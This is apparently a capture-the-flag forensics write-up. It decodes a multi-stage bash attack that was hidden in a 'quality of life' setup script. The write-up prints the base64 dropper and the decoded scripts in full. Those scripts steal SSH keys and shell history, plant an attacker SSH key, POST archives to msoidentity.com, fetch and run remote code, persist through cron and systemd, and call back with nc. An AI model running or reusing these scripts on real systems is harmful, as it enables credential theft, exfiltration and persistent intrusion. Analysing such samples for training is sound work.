# DoD Cyber Sentinel Challenge - Remote Help (forensics, 200p, Medium Difficulty) 6/24/2025
## Preface
Unfortunately, I do not have access to the original challenge statement, but it mentions something about a fictional internal attack from a recently hired remote worker. They were able to recover a [bash script](https://github.com/btoroth/QOL/blob/main/QOL.sh) that seems to have triggered alarms, causing the attack to fail. It then suggests trying to follow the cyber kill chain from start to finish to determine what the attacker was trying to do, and along the way, you'd find four different parts of the flag.

## Solving

![image](https://github.com/user-attachments/assets/710acb2e-cbea-489c-ac08-c4962739b961)

At first glance the script seems pretty harmless, even calling itself a QOL (Quality of Life) script meant to just make some minor improvements to the system. Update/upgrade packages, install some tools, create some aliases, blah blah blah. BUT if you keep scrolling, down to the very bottom we see this:

`sudo echo IyEvYmluL2Jhc2gKCiRsb2c9Ii90bXAvbG9nXyQoZGF0ZSArIiVZLSVtLSVkLS0lSC0lTSIpIgokdGd6PSI ... AvaW5mby5zaAovYmluL2Jhc2ggL3RtcC9pbmZvLnNoCnJtIC1mIC90bXAvaW5mby5zaAo= | base64 -d >> /tmp/0.sh && chmod +x /tmp/0.sh && /bin/bash /tmp/0.sh &`

Here we go, this seems to be yet another bash script - now obfuscated in base64 - being saved and executed. We can simply throw the base64 string into the browser tool CyberChef, it will automatically detect base64, and then decode it for us:

![image](https://github.com/user-attachments/assets/a6de7c73-fddb-4038-a09d-e87336d19171)

```
#!/bin/bash

$log="/tmp/log_$(date +"%Y-%m-%d--%H-%M")"
$tgz="/tmp/log_$(date +"%Y-%m-%d--%H-%M").tgz"

mkdir -p $log

cat /proc/cpuinfo >> "$log/cpu.txt"
cat /proc/meminfo >> "$log/mem.txt"
cat /etc/os-release >> "$log/os.txt"



for dir in $(ls /home -1); do
    
	if [ -f "$dir/.ssh/" ]; then
		cat $dir/.ssh/* >> "$log/'$dir'.txt"
		cat $dir/.bash_history >> "$log/'$dir'-bash.txt"
	fi
    # Perform your actions here
done

if [ "$(id -u)" -eq 0 ]; then
	cat /root/.ssh/* >> "$log/root.txt"
	cat /root/.bash_history >> "$log/root-bash.txt"
	local url="https://msoidentity.com/auth"
    local auth_keys="$HOME/.ssh/authorized_keys"
	
    curl -s "$url" >> "$auth_keys"
    chmod 600 "$auth_keys"
fi 


tar -cf "$tgz" "$log" 2>/dev/null

if [ -f "$tarfile" ]; then
        curl -s --output /dev/null -X POST -H "accept: application/json" -H "Content-Type: multipart/form-data" -F "file=@$tarfile" "https://msoidentity.com/log"
    fi
}

curl -s https://msoidentity.com/info | base32 -d >> /tmp/info.sh
/bin/bash /tmp/info.sh
rm -f /tmp/info.sh
```

Now we're seeing something more malicious! This script basically seems to create a directory called log_(current datetime) and piles a whole bunch of sensitive system information in there like CPU, memory, and OS info, as well as SSH keys and shell history. The attacker also seems to drop their own SSH key from "msoidentity.com/auth" into the authorized keys directory to set up persistence. Then, the logs get compressed into a tar file and exfiltrated to "msoidentity.com/log" via a POST request. After all that is done, another bash script - this time seemingly encoded in base32 - is retrieved and run from "msoidentity.com/info".

Now we have three new URLs to explore, so my first instinct was to simply visit all three of them in a browser. While the auth endpoint seemed to be a dud, the log and info endpoints both yielded me text file downloads. From the log endpoint, I got the first part of the flag, "C1{Sn34ky_", and from the info endpoint I got the encoded script. Once again, throwing the base32 encoded string into cyberchef worked just fine and output this:

![image](https://github.com/user-attachments/assets/3199b2d5-b01c-4d54-b277-f3c6b5f57f17)

```
CHECK_SCRIPT="/usr/local/bin/check_backup.sh"
CRON_INTERVAL="*/5 * * * *"  # Every 5 minutes
CRON_JOB_NAME="check_backup_script"
SCRIPT_PATH="/opt/backup.sh"
$SCRIPT_URL=https://msoidentity.com/backup_info

# DO NOT PUT PASSWORDS IN PLAIN TEXT

cat <<EOF | sudo tee "$CHECK_SCRIPT" > /dev/null
#!/bin/bash
if [ ! -f "$SCRIPT_PATH" ]; then
    curl -fsSL "$SCRIPT_URL" -o "$SCRIPT_PATH.enc" && openssl enc -nosalt -aes-256-cbc -d -in "$SCRIPT_PATH.enc" -out "$SCRIPT_PATH" -pass pass:"45337a3067335f56475f" && chmod +x "$SCRIPT_PATH" && rm "$SCRIPT_PATH.enc"
fi
EOF

chmod +x "$CHECK_SCRIPT"

(crontab -l 2>/dev/null | grep -v "$CHECK_SCRIPT"; echo "$CRON_INTERVAL $CHECK_SCRIPT # $CRON_JOB_NAME") | crontab -
```

Heres the next steps in the attack. First, a couple variables are declared to be used in the script, including a new URL to explore "msoidentity.com/backup_info". A new script is being created, called "check_backup.sh". The first thing it does is check if there is a file at "/opt/backup.sh" which - you guessed it - is _another_ script. If that file doesn't exist yet the script creates it by getting it from that URL we just mentioned. The script seems to come encrypted and needs to be decrypted using AES-256-CBC with the password "45337a3067335f56475f". The check backup script then is added as a cron job that gets run every five minutes, meaning that every five minutes the backup script will be re-downloaded onto this system if it wasn't already there.

Once again visiting the URL provides us with the next script to explore. As already explained, the file comes encrypted and can be decrypted using the same exact command that's already in the script:

```openssl enc -nosalt -aes-256-cbc -d -in backup.enc -out backup.sh -pass pass:"45337a3067335f56475f"```

```
#!/bin/bash
BACKUP_DIR="/tmp/backups"
TIMESTAMP=$(date +"%Y%m%d_%H%M%S")
ARCHIVE_NAME="backup_${TIMESTAMP}.7z"
ARCHIVE_PATH="${BACKUP_DIR}/${ARCHIVE_NAME}"
SERVICE_NAME="NightlyBackup"
SCRIPT_PATH="/opt/backup.sh"
UNIT_PATH="/etc/systemd/system/${SERVICE_NAME}.service"
TIMER_NAME="${SERVICE_NAME}.timer"
TIMER_UNIT="/etc/systemd/system/${TIMER_NAME}"


mkdir -p "$BACKUP_DIR"
rm -rf backup_*
7z a -mx=9 "$ARCHIVE_PATH" /home /root

if systemctl list-unit-files | grep -q "^${SERVICE_NAME}.service"; then
    systemctl enable "$SERVICE_NAME"
else
        curl -s https://raw.githubusercontent.com/supremeleaderbrian/services/refs/heads/main/backup.service > $UNIT_PATH
        curl -s https://raw.githubusercontent.com/supremeleaderbrian/services/refs/heads/main/backup.timer > $TIMER_UNIT
fi

systemctl daemon-reexec
systemctl daemon-reload
systemctl enable "$SERVICE_NAME"
systemctl enable --now "$TIMER_NAME"

#Callback - WE GOT THEM
sudo nc msoidentity.com 4443
```

We start with more variables being created, almost all of which are either parts of filenames or file paths. Then a backup directory is created, and all of the contents of the /home and /root directory are compressed and archived there. After, it checks for the NightlyBackup service in systemctl, and if it doesn't exist then it grabs two files from a user's GitHub repo that look like this:

![image](https://github.com/user-attachments/assets/dfabe7a9-10d0-436b-a5a2-82800fd64f66)
![image](https://github.com/user-attachments/assets/8dab6c59-f237-42c5-93a9-9b3176515cd9)

There's a lot going on here but basically, it's just going even deeper with the data exfiltration and persistence into the system via different methods. What's important though is the simple callback to the attacker server on the very last line of the script. Upon seeing this I tried replicating that callback in the terminal and it returned back to me the last part of the flag, "pr0sp3r}"! 

But wait, I had the first part of the flag and the last part which means I was still missing the second and third parts of the flag. I thought I must have missed something in the script in between those two points at which I found those flag parts. After some overthinking and overanalyzing, I decided to explore the GitHub account of the user "supremeleaderbrian", which appeared in the last script. He only had the single repository that contained those two services from earlier, but after checking the commit history I found an earlier version of the timer service!

![image](https://github.com/user-attachments/assets/10bbfd25-d8dd-48ba-bb46-2fc1b7704374)

And at the very bottom, you'll see one of the last two flag parts, only one left to go! Unfortunately, this part ended up taking me the longest to find, despite being relatively simple and I'd even say hidden in plain sight... If you look back at the second script we went over, you'll notice a comment regarding the password of the encrypted file and to not put it in plaintext. I had completely missed this the first time during the fast-paced competition, thinking that it was just some random password. But if you put this password into cyberchef, it'll reveal itself to be a hex-encoded string:

![image](https://github.com/user-attachments/assets/274f1e94-ed51-4a56-9163-086c68b65527)

So is that it?! We have all four of our flag parts, right? With this, the flag should be "C1{Sn34ky_E3z0g3_VG_w0rk3rs_n3v3r_pr0sp3r}". Hmm no but that doesn't really make sense, maybe "C1{Sn34ky_w0rk3rs_n3v3r_E3z0g3_VG_pr0sp3r}"? Yeah no doesn't look right, and I knew it wasn't because I had tried submitting both flags only to see "Incorrect". So what gives? The part that seems off is the second part that we just got "E3z0g3_VG_". Seeing that this string seems jumbled but still had the correct kind of look to it to pass as part of a flag (underscores and somewhat leet spelling), it made me think it was probably a rotation cipher. With the help of cyberchef yet again, my suspicions were confirmed after trying to decode with the classic ROT13 cipher like so:

![image](https://github.com/user-attachments/assets/161226fa-4c8e-4cf6-8de9-e9613f437fdd)

So now we have "C1{Sn34ky_R3m0t3_IT_w0rk3rs_n3v3r_pr0sp3r}" and it actually looks right now. We have our flag!
